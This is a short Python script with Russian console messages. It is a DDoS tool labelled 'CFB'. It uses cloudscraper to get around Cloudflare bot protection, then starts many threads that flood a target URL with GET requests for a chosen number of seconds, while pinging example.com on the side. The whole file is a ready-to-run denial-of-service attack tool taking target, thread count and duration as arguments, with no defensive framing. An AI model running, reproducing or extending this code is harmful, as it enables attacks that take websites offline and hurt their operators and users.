import threading
import cloudscraper
import datetime
import time
import subprocess
from colorama import Fore, init
import sys

init(convert=True)

def LaunchCFB(url, threadss, t, ping_interval):
    until = datetime.datetime.now() + datetime.timedelta(seconds=int(t))
    threads_count = 0
    scraper = cloudscraper.create_scraper()

    print(Fore.MAGENTA + f" [>] Атака => {url} на {t} секунд")

    ping_thread = threading.Thread(target=ping_example_com, args=(ping_interval,))
    ping_thread.start()

    while threads_count <= int(threadss):
        try:
            th = threading.Thread(target=AttackCFB, args=(url, until, scraper,))
            th.start()
            threads_count += 1
        except:
            pass

    th.join()

    ping_thread.do_run = False
    ping_thread.join()

def AttackCFB(url, until_datetime, scraper):
    while (until_datetime - datetime.datetime.now()).total_seconds() > 0:
        try:
            scraper.get(url, timeout=15)
        except:
            pass

def ping_example_com(interval):
    while getattr(threading.current_thread(), "do_run", True):
        try:
            result = subprocess.run(['ping', '-c', '1', 'example.com'], capture_output=True, text=True)
            print(Fore.CYAN + result.stdout.strip())
            time.sleep(interval)
        except KeyboardInterrupt:
            break

if __name__ == '__main__':
    if len(sys.argv) != 5:
        print(Fore.RED + " [!] Неверное количество аргументов. Используйте: python3 cfb.py <url> <threads> <time> <ping_interval>")
        sys.exit(1)

    target, thread, t, ping_interval = sys.argv[1], sys.argv[2], sys.argv[3], sys.argv[4]

    LaunchCFB(target, int(thread), int(t), int(ping_interval))

    print(Fore.MAGENTA + "\n [>] Атака завершена.")
